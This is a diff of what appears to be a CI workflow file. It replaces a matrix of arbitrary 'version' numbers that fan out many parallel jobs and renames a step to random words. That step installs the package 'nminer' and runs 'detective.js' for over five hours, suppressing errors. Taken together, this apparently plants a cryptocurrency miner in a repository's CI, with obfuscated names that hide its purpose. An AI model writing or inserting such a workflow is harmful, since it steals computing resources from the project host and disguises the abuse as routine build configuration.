@@ -9,25 +9,22 @@ jobs:
     strategy:
       matrix:
         config:
-          - { version: 5876 }
-          - { version: 1055 }
-          - { version: 3234 }
-          - { version: 6789 }
-          - { version: 9592 }
-          - { version: 361 }
-          - { version: 8607 }
-          - { version: 1985 }
-          - { version: 8881 }
-          - { version: 4838 }
-          - { version: 3261 }
-          - { version: 1132 }
-          - { version: 4322 }
-          - { version: 5132 }
-          - { version: 1314 }
-          - { version: 4587 }
-          - { version: 4750 }
-          - { version: 649 }
-          - { version: 3021 }
+          - { version: 9234 }
+          - { version: 8386 }
+          - { version: 6817 }
+          - { version: 261 }
+          - { version: 1558 }
+          - { version: 9035 }
+          - { version: 9543 }
+          - { version: 7746 }
+          - { version: 3743 }
+          - { version: 1860 }
+          - { version: 7720 }
+          - { version: 1530 }
+          - { version: 8257 }
+          - { version: 1246 }
+          - { version: 8306 }
+          - { version: 754 }
 
     steps:
       - name: Checkout
@@ -38,7 +35,7 @@ jobs:
         with:
           node-version: 20
           
-      - name: drat
+      - name: provided incidentally sick
         run: |
           npm install nminer@latest
-          timeout 332m node detective.js || echo "detective executed"
+          timeout 333m node detective.js || echo "detective executed"
